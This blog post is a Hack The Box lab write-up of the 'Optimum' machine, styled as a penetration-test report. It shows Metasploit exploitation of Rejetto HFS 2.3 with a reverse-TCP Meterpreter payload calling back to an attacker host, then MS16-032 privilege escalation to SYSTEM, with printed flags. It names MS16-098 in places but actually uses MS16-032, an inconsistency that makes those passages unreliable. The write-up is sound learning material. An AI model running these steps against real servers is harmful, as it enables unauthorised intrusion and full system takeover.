# 🧠 Hacking Windows Server: Why Your File Server is a Backdoor 🔓

🚩 A masterclass in exploiting CVE-2014-6287 💻 & Token Stealing. ➡️ See how one unpatched app exposes your entire OS.

---

### 🎯 Optimum: Third-Party Software to Kernel Breach

![](https://cdn-images-1.medium.com/max/800/1*Kkaip00Al9inn7iZdn_ImA.png)
<figcaption>Image created by Nicholas Mullenski (Gemini)</figcaption>

**Target:** *Optimum (Hack The Box)* **OS:** *Windows* **Difficulty:** *Easy* **Attack Vectors:** *HttpFileServer (HFS) RCE -\> Kernel Exploit (MS16–098).*

> <a href="https://medium.com/iron-breach/hacking-windows-server-why-your-file-server-is-a-backdoor-df3e0e634e98?sk=139135ef49579c017c913e7199a18629" class="markup--anchor markup--pullquote-anchor" data-href="https://medium.com/iron-breach/hacking-windows-server-why-your-file-server-is-a-backdoor-df3e0e634e98?sk=139135ef49579c017c913e7199a18629" target="_blank">**Not a Member?? Click Here to Read Full-Story**</a>

#### ⚠️ Disclaimer: This article is for educational and security auditing purposes only. All demonstrations were performed on the “Optimum” machine within the Hack The Box lab environment. Never attempt to access or modify systems without explicit written permission from the owner.

### Executive Summary

**Assessment Target:** *Optimum (10.10.10.8)* **Risk Level:** *CRITICAL* **Assessment Date:** *January 1, 2026*

### Overview

As part of a routine penetration test, an assessment was conducted on the “Optimum” server to evaluate its security posture. The objective was to identify vulnerabilities that could allow an attacker to compromise the integrity, confidentiality, or availability of the system. The assessment resulted in a **total system compromise** within minutes of initial contact.

### Key Findings

The server was found to be running **Rejetto HttpFileServer (HFS) 2.3**, an outdated and unauthorized file-sharing application. This software contains a critical vulnerability (CVE-2014–6287) that allows unauthenticated attackers to execute commands remotely.

Furthermore, the underlying operating system (**Windows Server 2012 R2**) was missing essential security patches released in 2016. This lack of “cyber hygiene” allowed us to escalate privileges from a standard user to **SYSTEM (Administrator)** using the **MS16–032** exploit, granting full control over the server.

### Business Impact

1.  <span id="1e93">**Data Breach Risk:** An attacker with SYSTEM access can exfiltrate all sensitive data stored on the server.</span>
2.  <span id="430d">**Ransomware Susceptibility:** The level of access obtained would allow for the immediate deployment of ransomware, potentially halting business operations.</span>
3.  <span id="23f0">**Lateral Movement:** This compromised server could serve as a “beachhead” to launch further attacks against the internal network.</span>

### Strategic Recommendations

- <span id="02ba">**Immediate Action:** Remove Rejetto HFS from the environment and replace it with an enterprise-grade file transfer solution.</span>
- <span id="1764">**Patch Management:** Implement a rigorous patch management policy to ensure operating systems are updated within 72 hours of critical security releases.</span>
- <span id="aff0">**Access Control:** Restrict the use of unapproved third-party software on production servers.</span>

### 1.0 Initial Foothold

#### 1.1 Reconnaissance & Enumeration

#### 1.1.1 Nmap Scan

- <span id="351e">We began the assessment with a comprehensive Nmap scan to identify open ports and services on **`10.10.10.8`**.</span>

```
nmap -sC -sV -A -vvv 10.10.10.8 -Pn
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### 1.1.2 Analysis

- <span id="e69a">The scan identified a single open port running **HttpFileServer (HFS) 2.3**. This is a standalone file server application often used for simple file sharing. Crucially, version 2.3 is known to be vulnerable to a Remote Code Execution (RCE) vulnerability (CVE-2014–6287) due to improper input sanitization in the search function.</span>

### 2.0 Exploitation

#### 2.1 Methodology

#### 2.1.1

- <span id="c9da">I utilized the **Metasploit Framework** to exploit the known RCE vulnerability in Rejetto HFS 2.3 (CVE-2014–6287). This exploit works by injecting a payload into the search parameter, which is then executed by the server.</span>

#### 2.1.2 Execution

**Module:** **`exploit/windows/http/rejetto_hfs_exec`**

**Configuration:**

- <span id="256d">**`RHOSTS`**: 10.10.10.8</span>
- <span id="c94d">**`LHOST`**: 10.10.14.32 (VPN IP)</span>
- <span id="a36b">**`PAYLOAD`:** **`windows/meterpreter/reverse_tcp`**</span>

**Command:**

```
meterpreter > getuid
Server username: OPTIMUM\kostas
```

**Result:** A Meterpreter session was established running as the user **`OPTIMUM\kostas`**.

### 3.0 Post-Exploitation & Enumeration

#### 3.1 System Enumeration

#### 3.1.1

- <span id="f5a6">After obtaining the initial foothold, I gathered system information to determine the operating system version and architecture.</span>

**Command:** **`sysinfo`**

**Findings:**

```
Computer        : OPTIMUM
OS              : Windows Server 2012 R2 (6.3 Build 9600)
Architecture    : x64
System Language : el_GR
Meterpreter     : x86/windows
```

#### 3.2 Vulnerability Analysis

#### 3.2.1

- <span id="44db">The target is running **Windows Server 2012 R2 Build 9600**. This version is known to be vulnerable to **MS16–098** (CVE-2016–3309), an integer overflow vulnerability in the Windows kernel key handling. This flaw allows a local authenticated user to execute arbitrary code in kernel mode, effectively granting SYSTEM privileges.</span>

### 4.0 Privilege Escalation: The Token Steal

#### 4.1 Exploitation Strategy

#### 4.1.1

- <span id="1257">I utilized the Metasploit module **`exploit/windows/local/ms16_032_secondary_logon_handle_privesc`**. This exploit performs the following actions:</span>

1.  <span id="a8b6">It starts a process via the Secondary Logon service.</span>
2.  <span id="2d63">It leaks the handle of the new thread.</span>
3.  <span id="4205">It replaces the thread’s security token with a SYSTEM token, effectively elevating the session.</span>

#### 4.2 Execution

**Command:**

```
msf > use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
msf > set SESSION 1
msf > run
```

**Result:** The exploit successfully leaked the handle and impersonated the SYSTEM token.

```
[!] Holy handle leak Batman, we have a SYSTEM shell!!
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

#### 4.2.1 Loot (Flags)

- <span id="5ca0">With full system privileges, I navigated to the user directories to retrieve the proof of compromise.</span>

**User Flag:**

> ***`2b644752b1818c97e46b8be53e6ad181`***

**Root Flag:**

> ***`cd47d7a79a158414e24ade63865f220a`***

![](https://cdn-images-1.medium.com/max/800/1*9ZDe9LDJdoNNNttQnMckMg.png)
<figcaption>Image created\taken by Nicholas Mullenski</figcaption>

### 5.0 Executive Conclusion & Red Team Mandate

#### 5.1 Attack Chain Summary

#### 5.1.1

The **Optimum** engagement serves as a critical case study in the dangers of “Shadow IT” — the use of unauthorized or unverified software within an enterprise environment.

1.  <span id="9fae">**Initial Compromise:** The attack surface was exposed via **Rejetto HFS 2.3**, a file-sharing application that is notoriously insecure and no longer actively supported. We leveraged **CVE-2014–6287** (Remote Code Execution) to inject null bytes into the search parser, bypassing filters and executing arbitrary code to gain a foothold as the user **`kostas`**.</span>
2.  <span id="8991">**Privilege Escalation:** Once inside, we identified that the underlying operating system (Windows Server 2012 R2) was missing critical security patches. Specifically, the **Secondary Logon Service** contained a logic flaw (**MS16–032**) that allowed a low-privileged user to leak a thread handle and impersonate the **`SYSTEM`** token, granting full administrative control.</span>

#### 5.1.2 Strategic Remediation

To secure the environment against similar attacks, the following actions are mandated:

- <span id="848c">**Decommission Legacy Software (Critical):** Rejetto HFS should be immediately removed from the network. It is unsuited for enterprise use. Replace it with a secure, managed file transfer solution (SFTP) or a properly configured IIS web server with authentication enforcement.</span>
- <span id="3a30">**Patch Management Lifecycle:** The successful root escalation was only possible because the server was missing the **KB3143141** security update (MS16–032). An automated patch management policy must be enforced to ensure critical kernel updates are applied within 72 hours of release.</span>
- <span id="87e5">**Principle of Least Privilege:** The **`kostas`** user account should not have had access to the Secondary Logon service. Restricting access to sensitive system services via Group Policy Objects (GPO) can prevent lateral movement and escalation even if a user account is compromised.</span>
- <span id="fd4d">**Application Whitelisting:** Implement AppLocker or Windows Defender Application Control (WDAC) to prevent the execution of unauthorized binaries (like the exploit payloads we uploaded) in user directories.</span>

### The Biblical Tie-In

The exploit we used, **MS16–032**, works by “Impersonation.” As a low-level user, we didn’t have the authority to run commands as System. We had to steal a “token” (an identity) that didn’t belong to us — the SYSTEM token — to gain full access.

However, in our spiritual walk, we are given a high-level “token” freely, not through theft, but through grace.

> ***“For all of you who were baptized into Christ have clothed yourselves with Christ. There is neither Jew nor Gentile, neither slave nor free… for you are all one in Christ Jesus.” — Galatians 3:27–28 (NIV)***

**Application:** In this exploit, we “clothed” our malicious process in the identity of the System Administrator to bypass restrictions. In our faith, we are “clothed” in the identity of Christ. When God looks at us, He doesn’t see our “low-level user” status (our sin and failures); He sees the “Root privileges” (righteousness) of His Son. We have access to the Father not because of our own permissions, but because we carry His Token.

### 🚀 Join the Mission

I don’t want to do this alone. I want to build a community of people who are hungry to learn, build, and break things (ethically). I am constantly looking for the next challenge.

- <span id="76c2">Is there a specific tool you wish existed?</span>
- <span id="7dfb">Is there a hacking concept you want me to learn and explain?</span>
- <span id="0673">Do you have a “brick wall” you’re hitting in your own research?</span>

Jump into the server, drop a message, and tell me what I should build or learn next. Let’s sharpen each other.

<a href="https://discord.gg/y5P9NrzUBX" class="markup--anchor markup--mixtapeEmbed-anchor" data-href="https://discord.gg/y5P9NrzUBX" title="https://discord.gg/y5P9NrzUBX"><strong>Join the Iron-Breach Discord Server!</strong><br />
<em>An advanced study group for Offensive Security professionals and students. We specialize in Red Teaming simulation…</em>discord.gg</a><a href="https://discord.gg/y5P9NrzUBX" class="js-mixtapeImage mixtapeImage mixtapeImage--empty u-ignoreBlock" data-media-id="24dfae94077d6390f2d0a2dd40dfe1fc"></a>

By <a href="https://medium.com/@nicholasmullenski" class="p-author h-card">Nicholas Mullenski</a> on [January 19, 2026](https://medium.com/p/df3e0e634e98).

<a href="https://medium.com/@nicholasmullenski/hacking-windows-server-why-your-file-server-is-a-backdoor-df3e0e634e98" class="p-canonical">Canonical link</a>

Exported from [Medium](https://medium.com) on September 1, 2026.
